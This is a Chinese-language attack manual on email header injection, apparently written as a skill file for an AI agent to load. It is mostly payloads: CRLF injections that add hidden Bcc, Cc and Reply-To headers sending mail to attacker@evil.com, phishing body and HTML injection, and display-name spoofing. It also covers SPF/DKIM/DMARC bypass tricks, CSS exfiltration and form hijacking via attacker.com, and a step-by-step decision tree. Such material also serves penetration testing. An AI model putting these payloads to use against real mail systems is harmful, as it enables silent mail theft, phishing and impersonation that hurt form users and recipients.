# 技能：邮件头注入 — 专家攻击手册

> **AI 加载指令**：专家级邮件头注入和身份验证绕过。涵盖 SMTP CRLF 注入、SPF/DKIM/DMARC 绕过、显示名伪造和邮件客户端渲染滥用。基础模型无法区分邮件头注入（技术层面）和邮件认证绕过（协议层面）之间的差异——本技能涵盖这两种攻击面。

## 0. 相关路由

- [crlf-injection](../crlf-injection/SKILL.md) — 通用 CRLF 注入；邮件头是一个高价值接收器
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) — 当 SMTP 服务器可通过 SSRF（gopher://smtp）访问时
- [open-redirect](../open-redirect/SKILL.md) — 在密码重置邮件中进行重定向作为钓鱼放大

---

## 1. SMTP 头注入基础

SMTP 头部通过 CRLF (`\r\n`) 分隔。如果用户输入未经清理直接放入邮件头部，注入 `%0d%0a`（或 `\r\n`）会添加任意头部。

### 注入结构

```
正常头部构造：
  To: user@example.com\r\n
  Subject: Contact Form\r\n
  From: noreply@target.com\r\n

注入（通过主题字段）：
  Subject: Hello%0d%0aBcc: attacker@evil.com\r\n
  
结果：
  Subject: Hello\r\n
  Bcc: attacker@evil.com\r\n
```

### 尝试的编码变体

| 编码 | 负载 |
|---|---|
| URL 编码 | `%0d%0a` |
| 双 URL 编码 | `%250d%250a` |
| Unicode | `\u000d\u000a` |
| 原始 CRLF | `\r\n`（在原始请求中） |
| 仅 LF | `%0a`（某些 SMTP 服务器接受 LF 而无需 CR） |
| 空字节 + CRLF | `%00%0d%0a` |

---

## 2. 攻击场景

### 2.1 BCC 注入 — 静默邮件窃取

```
输入字段：email / name / subject
负载：victim@target.com%0d%0aBcc:attacker@evil.com

效果：攻击者接收通过此表单发送的每封邮件的副本
```

### 2.2 带头部堆叠的 CC 注入

```
"From name" 字段中的负载：
  John%0d%0aCc:attacker@evil.com%0d%0aBcc:spy@evil.com

结果头部：
  From: John
  Cc: attacker@evil.com
  Bcc: spy@evil.com
  ... (原始头部继续)
```

### 2.3 正文注入 — 完全邮件内容控制

SMTP 中，空行 (`\r\n\r\n`) 分隔头部和正文：

```
主题中的负载：
  Urgent%0d%0a%0d%0aPlease click: https://evil.com/phish%0d%0a.%0d%0a

结果：
  Subject: Urgent
  
  Please click: https://evil.com/phish
  .
  
(空行终止头部，之后的所有内容都是正文)
```

### 2.4 回复地址操控用于钓鱼

```
"From name" 中的负载：
  IT Support%0d%0aReply-To:attacker@evil.com

受害者将 "IT Support" 视为发件人
回复发送到 attacker@evil.com
```

### 2.5 内容类型注入用于 HTML 钓鱼

```
负载：
  test%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Password Reset</h1><a href="https://evil.com">Click here</a>

覆盖内容类型 → 在邮件客户端中渲染 HTML
```

---

## 3. 常见易受攻击模式

### PHP mail()

```php
$to = $_POST['email'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$headers = "From: noreply@target.com";

// 所有参数均可注入：
mail($to, $subject, $message, $headers);

// $to 注入：    victim@x.com%0d%0aCc:attacker@evil.com
// $subject 注入： Hello%0d%0aBcc:attacker@evil.com
// $headers 注入： From: x%0d%0aBcc:attacker@evil.com
```

### Python smtplib

```python
msg = f"From: {user_from}\r\nTo: {user_to}\r\nSubject: {user_subject}\r\n\r\n{body}"
server.sendmail(from_addr, to_addr, msg)
# user_from / user_subject 如果未清理则可注入
```

### Node.js nodemailer

```javascript
let mailOptions = {
    from: req.body.from,      // 可注入
    to: 'admin@target.com',
    subject: req.body.subject, // 可注入
    text: req.body.message
};
transporter.sendMail(mailOptions);
```

---

## 4. SPF / DKIM / DMARC 绕过技术

### 4.1 SPF (发件人策略框架) 绕过

SPF 通过 DNS TXT 记录验证 `MAIL FROM` 信封发件人 IP。

| 技术 | 方法 |
|---|---|
| 子域名委托 | 目标有 `include:_spf.google.com`；攻击者使用 Google Workspace 以 `anything@mail.target.com` 的身份发送 |
| 包含链滥用 | `v=spf1 include:third-party.com` — 如果第三方允许广泛发送 |
| DNS 查询限制（10） | SPF 允许最多 10 个 DNS 查询；超出此限制的链 → `permerror` → 某些接收器接受 |
| `+all` 配置错误 | `v=spf1 +all` 允许任何 IP（罕见但存在） |
| `?all` 或 `~all` | 软失败/中性 → 大多数接收器仍将邮件投递到收件箱 |
| 无 SPF 记录 | 无 SPF 的域 → 任何人都可以以该域的身份发送 |

```bash
# 检查 SPF 记录：
dig TXT target.com +short
# 查找： v=spf1 ...

# 计算DNS查询（每个 include/a/mx/redirect = 1 查询）：
# >10 查询 = permerror = 绕过
```

### 4.2 DKIM (域名密钥识别邮件) 绕过

DKIM 使用域名密钥对特定头部进行签名。绕过向量：

| 技术 | 方法 |
|---|---|
| `d=` 与 `From:` 不匹配 | DKIM 使用 `d=subdomain.target.com` 签名，但 `From: ceo@target.com` — 有效 DKIM，但伪造发件人 |
| `l=` 标签滥用 | `l=` 限制签名的正文长度；攻击者在签名部分后附加内容 |
| 重放攻击 | 捕获有效的 DKIM 签名邮件，修改未签名的头部后重新发送 |
| 缺少 `h=from` | 如果 `from` 头部不在签名头部列表（`h=`）中，发件人可以被修改 |
| 密钥旋转窗口 | 在 DKIM 密钥旋转期间，旧选择器可能仍然有效 |

```bash
# 检查 DKIM 选择器：
dig TXT selector._domainkey.target.com +short
# 常见选择器：google, default, s1, s2, k1, dkim
```

### 4.3 DMARC (基于域的消息认证) 绕过

DMARC 要求 SPF 或 DKIM 与 `From:` 头部域 **对齐**。

| 技术 | 方法 |
|---|---|
| 松散对齐 (`aspf=r`) | SPF 对 `sub.target.com` 通过，DMARC 对 `target.com` 接受 |
| 组织域 | `mail.target.com` 与宽松模式下的 `target.com` 对齐 |
| 无 DMARC 记录 | 无 DMARC 的域 → 无策略执行 |
| `p=none` | DMARC 存在但策略是 `none` → 无执行，仅报告 |
| 子域名策略 (`sp=none`) | 主域 `p=reject` 但 `sp=none` → 子域名可被伪造 |

```bash
# 检查 DMARC：
dig TXT _dmarc.target.com +short
# 查找： v=DMARC1; p=none/quarantine/reject
```

### 4.4 显示名伪造（适用于所有情况）

即使 SPF/DKIM/DMARC 完美，显示名也不需要认证：

```
From: "admin@target.com" <attacker@evil.com>
From: "IT Security Team - target.com" <random@evil.com>
From: "noreply@target.com via Support" <attacker@evil.com>
```

大多数邮件客户端在收件箱视图中仅显示显示名。移动客户端尤其容易受攻击。

---

## 5. 邮件客户端渲染攻击

### 基于CSS的数据窃取

```html
<!-- 在 HTML 邮件正文 -->
<style>
  #secret[value^="a"] { background: url('https://attacker.com/leak?char=a'); }
  #secret[value^="b"] { background: url('https://attacker.com/leak?char=b'); }
</style>
<input id="secret" value="TARGET_VALUE">
```

### 远程图像跟踪

```html
<img src="https://attacker.com/track?email=victim@target.com&t=TIMESTAMP" width="1" height="1">
<!-- 不可见像素 — 确认邮件被打开，泄露 IP，客户端信息 -->
```

### 表单动作劫持

```html
<!-- 某些邮件客户端渲染表单 -->
<form action="https://attacker.com/phish" method="POST">
  <input name="password" type="password" placeholder="Confirm your password">
  <button type="submit">Verify</button>
</form>
```

---

## 6. 联系表单 / 邮件 API 注入

```text
# REST API
POST /api/send-email {"to":"user@target.com\r\nBcc:attacker@evil.com","subject":"Hello","body":"Test"}

# URL 编码表单
name=John&email=victim%40target.com%0d%0aBcc%3aattacker%40evil.com&message=test

# GraphQL
mutation { sendEmail(to:"user@target.com\r\nBcc:attacker@evil.com" subject:"Test" body:"Hello") }
```

---

## 7. 测试方法

```
1. 查找邮件功能：联系表单、密码重置、邀请/分享、新闻简报
2. 测试 CRLF：在每个字段中注入 test%0d%0aX-Injected:true → 检查接收到的头部
3. 升级：Bcc 注入 → 正文注入 → 内容类型覆盖
4. 并行：dig TXT target.com (SPF) + dig TXT _dmarc.target.com (DMARC)
```

---

## 8. 决策树

```
发现邮件发送功能？
│
├── 用户输入进入邮件头部？
│   ├── 是 → 测试 CRLF 注入
│   │   ├── %0d%0a 在主题/From/To 字段中
│   │   │   ├── 额外头部出现 → 确认
│   │   │   │   ├── 注入 Bcc: → 静默窃取
│   │   │   │   ├── 注入正文（空行）→ 内容控制
│   │   │   │   └── 注入 Reply-To: → 重定向回复
│   │   │   │
│   │   │   └── 被过滤？ → 尝试编码变体
│   │   │       ├── %250d%250a（双重编码）
│   │   │       ├── %0a 仅（LF 而无 CR）
│   │   │       └── Unicode \u000d\u000a
│   │   │
│   │   └── 所有编码被阻止 → 检查 SPF/DKIM/DMARC
│   │
│   └── 否（用户输入仅在正文中）→ 有限影响
│       └── 检查邮件正文中的 HTML 注入
│           └── 如果渲染 HTML → 钓鱼 / CSS 窃取
│
├── 想要伪造来自目标域的邮件？
│   ├── 检查 SPF：dig TXT target.com
│   │   ├── 无 SPF / +all / ~all → 直接伪造可能
│   │   └── -all → SPF 阻止；检查 DKIM/DMARC
│   │
│   ├── 检查 DMARC：dig TXT _dmarc.target.com
│   │   ├── 无 DMARC / p=none → 伪造邮件被投递
│   │   ├── p=quarantine → 落在垃圾邮件但被投递
│   │   └── p=reject → 被阻止；尝试子域名（sp= 策略）
│   │
│   └── 所有严格 → 仅显示名伪造
│       └── "admin@target.com" <attacker@evil.com>
│
└── 测试密码重置邮件？
    ├── 检查 URL 中的令牌 → 开放重定向链？
    │   └── 见 ../open-redirect/SKILL.md
    └── 检查主机头注入 → 密码重置中毒
        └── 见 ../http-host-header-attacks/SKILL.md
```

---

## 9. 快速参考 — 关键负载

```text
# 通过主题进行 BCC 注入
Subject: Hello%0d%0aBcc:attacker@evil.com

# 通过 From name 进行正文注入
From: Test%0d%0a%0d%0aClick here: https://evil.com

# 回复地址劫持
From: Support%0d%0aReply-To:attacker@evil.com

# 完全头部堆叠注入
email=victim%40target.com%0d%0aCc%3aspy1%40evil.com%0d%0aBcc%3aspy2%40evil.com

# 显示名伪造（无需注入）
From: "security@target.com" <attacker@evil.com>
```
